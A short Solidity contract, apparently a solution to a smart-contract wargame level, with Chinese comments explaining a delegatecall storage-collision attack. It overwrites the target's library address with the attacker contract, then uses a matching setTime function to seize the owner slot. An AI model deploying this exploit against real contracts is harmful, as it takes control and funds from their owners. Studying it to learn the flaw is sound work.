pragma solidity ^0.8.0;

contract Hack{

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address public add;
    constructor(address _add) public {
        add = _add;
    }

    function change_func() public {
        uint256 new_addr = uint256(uint160(address(this)));
        bytes memory data = abi.encodeWithSignature("setFirstTime(uint256)", new_addr);
        add.call(data);
    }

    function hack() public {
        uint256 new_owner = uint256(uint160(address(msg.sender)));
        bytes memory data = abi.encodeWithSignature("setFirstTime(uint256)", new_owner);
        add.call(data);
    }
    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

// step1 delegatecall上下文为调用者合约，利用这个将_timeZone1LibraryAddress改成攻击者合约
// step2 攻击者合约中实现setTime方法改owner